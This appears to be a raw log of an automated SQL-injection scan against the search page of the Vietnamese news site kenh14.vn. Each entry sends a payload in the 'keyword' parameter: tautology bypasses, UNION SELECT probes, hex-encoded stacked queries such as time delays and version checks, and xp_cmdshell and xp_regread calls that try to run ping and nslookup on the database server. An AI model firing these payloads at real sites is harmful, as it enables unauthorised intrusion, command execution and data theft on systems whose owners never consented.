+[Response]: OK - declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+[Request]: time:149.56519997119904 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)"} - {"":"undefineddeclare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)"} - declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+[Response]: OK - declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+[Request]: time:214.1550999879837 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)"} - {"":"undefineddeclare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)"} - declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+[Response]: OK - declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+[Request]: time:228.33690005540848 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or 1=1"} - {"":"undefined' or 1=1"} - ' or 1=1
+[Response]: OK - ' or 1=1
+[Request]: time:227.66740000247955 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\u0018 or 1=1 --"} - {"":"undefined\u0018 or 1=1 --"} -  or 1=1 --
+[Response]: OK -  or 1=1 --
+[Request]: time:203.12689995765686 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaix' OR full_name LIKE '%Bob%"} - {"":"undefinedx' OR full_name LIKE '%Bob%"} - x' OR full_name LIKE '%Bob%
+[Response]: OK - x' OR full_name LIKE '%Bob%
+[Request]: time:135.35320001840591 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'; exec master..xp_cmdshell 'ping 172.10.1.255'--"} - {"":"undefined'; exec master..xp_cmdshell 'ping 172.10.1.255'--"} - '; exec master..xp_cmdshell 'ping 172.10.1.255'--
+[Response]: OK - '; exec master..xp_cmdshell 'ping 172.10.1.255'--
+[Request]: time:156.32109999656677 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'%20or%20''='"} - {"":"undefined'%20or%20''='"} - '%20or%20''='
+[Response]: OK - '%20or%20''='
+[Request]: time:141.08799999952316 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'%20or%20'x'='x"} - {"":"undefined'%20or%20'x'='x"} - '%20or%20'x'='x
+[Response]: OK - '%20or%20'x'='x
+[Request]: time:210.3159999847412 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai')%20or%20('x'='x"} - {"":"undefined')%20or%20('x'='x"} - ')%20or%20('x'='x
+[Response]: OK - ')%20or%20('x'='x
+[Request]: time:171.04439997673035 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or 0=0 --"} - {"":"undefined' or 0=0 --"} - ' or 0=0 --
+[Response]: OK - ' or 0=0 --
+[Request]: time:143.3086000084877 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or 0=0 #"} - {"":"undefined' or 0=0 #"} - ' or 0=0 #
+[Response]: OK - ' or 0=0 #
+[Request]: time:186.37999999523163 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 0=0 #\""} - {"":"undefined or 0=0 #\""} -  or 0=0 #"
+[Response]: OK -  or 0=0 #"
+[Request]: time:174.80849999189377 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or 1=1--"} - {"":"undefined' or 1=1--"} - ' or 1=1--
+[Response]: OK - ' or 1=1--
+[Request]: time:195.70819997787476 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or '1'='1'--"} - {"":"undefined' or '1'='1'--"} - ' or '1'='1'--
+[Response]: OK - ' or '1'='1'--
+[Request]: time:138.26250004768372 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or 1 --'"} - {"":"undefined' or 1 --'"} - ' or 1 --'
+[Response]: OK - ' or 1 --'
+[Request]: time:189.17890000343323 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior 1=1--"} - {"":"undefinedor 1=1--"} - or 1=1--
+[Response]: OK - or 1=1--
+[Request]: time:280.76839995384216 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or 1=1 or ''='"} - {"":"undefined' or 1=1 or ''='"} - ' or 1=1 or ''='
+[Response]: OK - ' or 1=1 or ''='
+[Request]: time:143.2152999639511 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 1=1 or \"\"="} - {"":"undefined or 1=1 or \"\"="} -  or 1=1 or ""=
+[Response]: OK -  or 1=1 or ""=
+[Request]: time:203.86680001020432 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or a=a--"} - {"":"undefined' or a=a--"} - ' or a=a--
+[Response]: OK - ' or a=a--
+[Request]: time:140.18730002641678 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or a=a"} - {"":"undefined or a=a"} -  or a=a
+[Response]: OK -  or a=a
+[Request]: time:150.1618999838829 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai') or ('a'='a"} - {"":"undefined') or ('a'='a"} - ') or ('a'='a
+[Response]: OK - ') or ('a'='a
+[Request]: time:141.4936000108719 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'hi' or 'x'='x';"} - {"":"undefined'hi' or 'x'='x';"} - 'hi' or 'x'='x';
+[Response]: OK - 'hi' or 'x'='x';
+[Request]: time:180.10149997472763 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior"} - {"":"undefinedor"} - or
+[Response]: OK - or
+[Request]: time:213.96670001745224 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiprocedure"} - {"":"undefinedprocedure"} - procedure
+[Response]: OK - procedure
+[Request]: time:158.26199996471405 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaihandler"} - {"":"undefinedhandler"} - handler
+[Response]: OK - handler
+[Request]: time:177.25069999694824 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or username like '%"} - {"":"undefined' or username like '%"} - ' or username like '%
+[Response]: OK - ' or username like '%
+[Request]: time:157.53890001773834 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or uname like '%"} - {"":"undefined' or uname like '%"} - ' or uname like '%
+[Response]: OK - ' or uname like '%
+[Request]: time:144.48040002584457 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or userid like '%"} - {"":"undefined' or userid like '%"} - ' or userid like '%
+[Response]: OK - ' or userid like '%
+[Request]: time:198.64089995622635 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or uid like '%"} - {"":"undefined' or uid like '%"} - ' or uid like '%
+[Response]: OK - ' or uid like '%
+[Request]: time:163.46709996461868 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or user like '%"} - {"":"undefined' or user like '%"} - ' or user like '%
+[Response]: OK - ' or user like '%
+[Request]: time:221.4244999885559 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'; exec master..xp_cmdshell"} - {"":"undefined'; exec master..xp_cmdshell"} - '; exec master..xp_cmdshell
+[Response]: OK - '; exec master..xp_cmdshell
+[Request]: time:317.765900015831 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'; exec xp_regread"} - {"":"undefined'; exec xp_regread"} - '; exec xp_regread
+[Response]: OK - '; exec xp_regread
+[Request]: time:132.16820001602173 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đait'exec master..xp_cmdshell 'nslookup www.google.com'--"} - {"":"undefinedt'exec master..xp_cmdshell 'nslookup www.google.com'--"} - t'exec master..xp_cmdshell 'nslookup www.google.com'--
+[Response]: OK - t'exec master..xp_cmdshell 'nslookup www.google.com'--
+[Request]: time:160.08300000429153 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' UNION SELECT"} - {"":"undefined' UNION SELECT"} - ' UNION SELECT
+[Response]: OK - ' UNION SELECT
+[Request]: time:187.33749997615814 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' UNION ALL SELECT"} - {"":"undefined' UNION ALL SELECT"} - ' UNION ALL SELECT
+[Response]: OK - ' UNION ALL SELECT
+[Request]: time:157.31370002031326 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or (EXISTS)"} - {"":"undefined' or (EXISTS)"} - ' or (EXISTS)
+[Response]: OK - ' or (EXISTS)
+[Request]: time:212.5077999830246 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' (select top 1"} - {"":"undefined' (select top 1"} - ' (select top 1
+[Response]: OK - ' (select top 1
+[Request]: time:203.2742999792099 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'||UTL_HTTP.REQUEST"} - {"":"undefined'||UTL_HTTP.REQUEST"} - '||UTL_HTTP.REQUEST
+[Response]: OK - '||UTL_HTTP.REQUEST
+[Request]: time:205.90009999275208 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1;SELECT%20*"} - {"":"undefined1;SELECT%20*"} - 1;SELECT%20*
+[Response]: OK - 1;SELECT%20*
+[Request]: time:212.68290001153946 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai<>\"'%;)(&+"} - {"":"undefined<>\"'%;)(&+"} - <>"'%;)(&+
+[Response]: OK - <>"'%;)(&+
+[Request]: time:502.5737000107765 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'%20or%201=1"} - {"":"undefined'%20or%201=1"} - '%20or%201=1
+[Response]: OK - '%20or%201=1
+[Request]: time:142.89419996738434 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'sqlattempt1"} - {"":"undefined'sqlattempt1"} - 'sqlattempt1
+[Response]: OK - 'sqlattempt1
+[Request]: time:163.287299990654 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai29%"} - {"":"undefined29%"} - 29%
+[Response]: OK - 29%
+[Request]: time:148.79070001840591 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai26%"} - {"":"undefined26%"} - 26%
+[Response]: OK - 26%
+[Request]: time:145.2552000284195 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or ''='"} - {"":"undefined' or ''='"} - ' or ''='
+[Response]: OK - ' or ''='
+[Request]: time:197.4569000005722 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or 3=3"} - {"":"undefined' or 3=3"} - ' or 3=3
+[Response]: OK - ' or 3=3
+[Request]: time:183.56370002031326 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai' or 3=3 --"} - {"":"undefined' or 3=3 --"} - ' or 3=3 --
+[Response]: OK - ' or 3=3 --
+[Request]: time:203.73299998044968 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai"} - {"":"undefined"} - 
+[Response]: OK - 
